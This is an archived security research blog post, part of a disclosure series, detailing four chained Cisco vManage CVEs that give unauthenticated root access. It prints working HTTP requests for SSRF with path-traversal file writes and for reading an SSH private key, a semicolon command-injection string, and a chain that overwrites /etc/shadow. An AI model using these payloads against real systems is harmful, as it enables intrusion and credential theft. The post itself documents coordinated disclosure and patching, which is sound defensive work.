---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-23_sd-pwn-part-3-cisco-vmanage-another-day-another-network-takeover.md
original_filename: 2020-11-23_sd-pwn-part-3-cisco-vmanage-another-day-another-network-takeover.md
title: SD-PWN — Part 3 — Cisco vManage — Another Day, Another Network Takeover
category: documents
detected_topics:
- command-injection
- path-traversal
- access-control
- ssrf
- otp
- csrf
tags:
- imported
- documents
- command-injection
- path-traversal
- access-control
- ssrf
- otp
- csrf
language: en
raw_sha256: b61f7137ddbc54688e45a31a18ed176cfbc0a31d065437714d8f9a1fc2eebfb3
text_sha256: f147886a3318b23c21aefa3561b8724cc18aba618dc2daf3dc8b697479ded5b8
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# SD-PWN — Part 3 — Cisco vManage — Another Day, Another Network Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-23_sd-pwn-part-3-cisco-vmanage-another-day-another-network-takeover.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, access-control, ssrf, otp, csrf
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `b61f7137ddbc54688e45a31a18ed176cfbc0a31d065437714d8f9a1fc2eebfb3`
- Text SHA256: `f147886a3318b23c21aefa3561b8724cc18aba618dc2daf3dc8b697479ded5b8`


## Content

---
title: "SD-PWN — Part 3 — Cisco vManage — Another Day, Another Network Takeover"
url: "https://medium.com/realmodelabs/sd-pwn-part-3-cisco-vmanage-another-day-another-network-takeover-15731a4d75b7"
authors: ["Realmode Labs (@RealmodeLabs)"]
programs: ["Cisco"]
bugs: ["RCE", "SSRF", "Arbitrary file write", "Path traversal", "OS command injection", "Local Privilege Escalation"]
publication_date: "2020-11-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4110
scraped_via: "browseros"
---

# SD-PWN — Part 3 — Cisco vManage — Another Day, Another Network Takeover

SD-PWN — Part 3 — Cisco vManage — Another Day, Another Network Takeover
Yaar Hahn
Follow
5 min read
·
Nov 23, 2020

54

This is the third post in a series of four, see previous parts here:

Part 1 — Silver Peak Unity Orchestrator

Part 2 — Citrix SD-WAN Center

This post continues our SD-WAN journey. In case you haven’t already read parts 1 and 2, you should definitely take a look. In short, we found critical unauthenticated RCE vulnerabilities in four of the leading products in the SD-WAN market and this time we’ll talk about Cisco Viptela vManage.

Cisco Viptela vManage

Cisco Viptela vManage is the brain of Cisco’s SD-WAN infrastructure, managing all the different endpoints in the network. Because of the centralised nature of the SD-WAN design, vManage is a single point of failure from a security perspective.

By chaining 4 different vulnerabilities, we were able to gain an unauthenticated RCE as root on the vManage machine, often hosted in the company’s cloud environment. An attacker doesn’t need any prior knowledge of the configuration to exploit these flaws.

If your organization uses Cisco’s Viptela SD-WAN solution, update your appliances urgently. The newest firmware has patches for all the issues listed below.

Technical Details

The initial attack vector for the system is the web management server, running on port 443 on the vManage machine. The webserver is running java applets using the JBoss framework. The unauthenticated attack surface of the web management interface is listed in the web.xml file, clearly defining all URL paths that are reachable.

SSRF + Arbitrary File Write — CVE-2020–27128

While looking at possible entry points, we noticed the /dataservice entry point. We’re unsure of the exact intention of the code, but our assumption is that the different endpoints share data and statistics using the dataservice URLs.

The /dataservice/statistics/download/dr/filelist handler is responsible for downloading statistics between two machines in the system. It receives the adjacent machine’s IP address and the statistics file name and downloads it for later use.

No user input validation was done at all, allowing for multiple bugs. First, any IP can be passed to the handler in the sourcevManageIp parameter, allowing for an SSRF attack. Second, directory traversal in the token and fileType parameters allows the attacker to download the above data to any destination path and can even overwrite existing files.

The server runs as the vmanage user, allowing for a couple of interesting files to be overwritten.

Moreover, the handler wasn’t protected with any CSRF mechanism.

POST /dataservice/statistics/download/dr/filelist HTTP/1.1
Host: 192.168.100.2:8443
Content-Length: 210
Origin: https://192.168.100.2:8443
Content-Type: application/json
{“queue”:0, “fileType”:”/../../../../../../../tmp/”, “deviceIp”:””, “sourcevManageIp”:”1.2.3.4:12345", “fileList” : [{“file” : “droppeb.bin”, “token”:”../../../../../../../../../../../”}]}

Will cause the server to GET the following path:

https://1.2.3.4:12345/dataservice/statistics/download/remoteprocessing/file/../../../../../../../dropped.bin

And will write the file contents to /opt/data/app-server/statistics/queue-0//../../../../../../../tmp/dropped.bin.

Although this is a critical bug that might be leveraged to an RCE, it wasn’t part of the final chain.

Unauthenticated File Read + Directory Traversal — CVE-2020–26073

Next to the handler above, we noticed another interesting handler — /dataservice/disasterrecovery/download/token/ .

It receives a single parameter — a file to read… Again, no user input validation is performed, allowing for an easily exploitable directory traversal. An attacker is able to read any file which is accessible with the vManage user.

GET /dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fviptela%2F.ssh%2Fid_dsa HTTP/1.1
Host: 192.168.100.2:443

Will read the contents of /etc/viptela/.ssh/id_dsa.

SSH Keys

/etc/viptela/.ssh/id_dsa is a secret private key for SSH connections, readable with the permissions of the manage user. It allows the attacker to connect via SSH as vmanage-admin.

Get Yaar Hahn’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

vmanage-admin’s login binary is viptela_cli, just like admin’s, although vmanage-admin doesn’t gain access to the regular CLI console. This is decided in viptela_cli’s main function, which verifies the username. Otherwise, the user can send a single command through the SSH connection, allowing for some attack surface.

Command Injection in viptela_cli — CVE-2020–27129

After logging in with the above SSH key, viptela_cli parses the user supplied commands. Any commands that are sent through the SSH connection are validated before being executed.

Only commands starting with scp -f are allowed normally. Unfortunately, no sanitization is performed on the rest of the command, allowing an attacker to inject another command using a semicolon.

scp -f -h; touch /tmp/exploit;

The command above will be run as vmanage-admin user.

Privilege Escalation using busybox.suid — CVE-2020–26074

While looking at different options to elevate privileges in the system, we noticed a special suid file — busybox.suid. The SUID bit in the filesystem will elevate the privileges of the binary to root every time it is executed. Busybox.suid allows running multiple busybox applets as root.

An interesting applet is tftp, which allows uploads and downloads to the system using the tftp protocol. No validation is made for the destination path, enabling a malicious user to overwrite any file with any given data as root. This enables full control of the system.

One basic example is overwriting the /etc/shadow file with a new root password, and then simply running su to gain root access.

Full RCE Chain
Read vmanage-admin’s private SSH key using the directory traversal vulnerability
Login via SSH and inject a command that will run the privilege escalation
Overwrite /etc/shadow using the busybox.suid’s tftp applet
Run the su command to gain root command execution

Notice that this is only one way to exploit these vulnerabilities. Other, possibly easier, chains can be found.

Timeline

Realmode Labs would like to thank Cisco and their PSIRT for their excellent communication in the process of reporting and fixing the flaws.

2020–07–31 — Realmode Labs sent an initial report to Cisco PSIRT

2020–07–31 — Cisco PSIRT acknowledges the report, assigns manager

2020–11–02 — Cisco PSIRT assigns CVE numbers, releasing fixed software

2020–11–04 — Advisories and CVEs are published

2020–11–23 — This report is published

Make sure you follow us on LinkedIn or contact us at contact@realmodelabs.com for the next SD-PWN vulnerability post.

If you are interested in conducting a security audit for one of your products, contact us. Our team consists of researchers of the highest level with a proven track record in finding the most elusive vulnerabilities.

References

Bug 1 — SSRF + Arbitrary File Write — CVE-2020–27128

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vmanage-file-Y2JSRNRb

Bug 2 — Unauthenticated File Read + Directory Traversal — CVE-2020–26073

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vman-traversal-hQh24tmk

Bug 3 — Command Injection in viptela_cli — CVE-2020–27129

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vmanage-privilege-zPmMf73k

Bug 4 — Privilege Escalation using busybox.suid — CVE-2020–26074

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vmanage-escalation-Jhqs5Skf
